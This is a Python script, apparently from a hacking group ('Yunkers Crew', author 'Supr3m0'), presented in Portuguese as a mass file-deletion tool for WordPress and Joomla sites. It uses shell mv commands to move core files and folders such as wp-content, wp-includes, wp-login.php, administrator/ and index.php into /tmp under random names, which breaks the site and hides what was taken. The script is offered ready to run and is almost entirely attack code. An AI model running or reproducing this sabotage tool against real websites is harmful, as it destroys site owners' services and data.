import os.path as diretorio  ; import os as sistema
import sys ; import argparse as arg  ; import random

index = r"""
 __  __                                   
/\ \/\ \       Yunkers Crew ;)                           
\ \ \ \ \     __    ___   __  __    ____  
 \ \ \ \ \  /'__`\/' _ `\/\ \/\ \  /',__\ 
  \ \ \_/ \/\  __//\ \/\ \ \ \_\ \/\__, `\
   \ `\___/\ \____\ \_\ \_\ \____/\/\____/
    `\/__/  \/____/\/_/\/_/\/___/  \/___/  v1

                            
	* Ferramenta para deletar arquivos em massa!
	* Criado por: Supr3m0
	* Facebook: www.facebook.com/yunkers01/
"""
manual = """
--cms      Tipo de CMS (Wordpress / Joomla)
--index    Deletar TAMBEM o arquivo "index.php"

Use: python {} --cms CMS 
""".format(sys.argv[0])

parser = arg.ArgumentParser()
parser.add_argument("--cms","-c", action='store')
parser.add_argument("--index","-I", action='store_true')
param = parser.parse_args()

if len(sys.argv) ==1 : print(index + "\n" + manual) ; exit()

cms = ""
if param.cms == "Wordpress": cms = "Wordpress"
elif param.cms == "Joomla": cms = "Joomla"
else: print(index + "\n[x] CMS Invalido!") ; exit()

def del_joomla():
	diretorios_joomla = ["update",  "templates", "plugins", "modules", "media", "logs", "libraries", "includes", "cli","cache/","components/", "administrator/", "images/", "tmp/", "html/", "css/", "javascript/", "language/", "component.php", "error.php", "favicon.ico", "templateDetails.xml", "template_preview.png", "template_thumbnail.png"]
	for y in diretorios_joomla:
		if diretorio.exists(y): 
			sistema.system("mv {} /tmp/{}venus.YC".format(y, random.randint(0,20000)))
			print("{} => OK!".format(y))
		else: continue
	if param.index:
		if diretorio.exists("index.php"): 
			sistema.system("mv {} /tmp/{}venus.YC".format("index.php", random.randint(0, 922)))
			print("index.php => OK!")
		else: print("index.php => FAIL!")

def del_wordpress():
	diretorios_wp = ["wp-content/", "wp-login.php", "wp-includes/", "header.php", "page.php", "wp-post.php", "single.php", "sidebar.php", "category.php", "comments.php", "archive.php", "footer.php"]
	for y in diretorios_wp:
		if diretorio.exists(y): 
			sistema.system("mv {} /tmp/{}venus.YC".format(y, random.randint(0,20000)))
			print("{} => OK!".format(y))
		else: continue
	if param.index:
		if diretorio.exists("index.php"): 
			sistema.system("mv {} /tmp/{}venus.YC".format("index.php", random.randint(0, 922)))
			print("index.php => OK!")
		else: print("index.php => FAIL!")

def inicio():
	print(index)
	print("[+] Tipo de CMS: {}".format(param.cms))
	print("[*] Deletando arquivos...")
	if cms == "Joomla": del_joomla()
	else: del_wordpress()
	print("\n[=] Finalizado!!!") ; exit()
	
inicio()
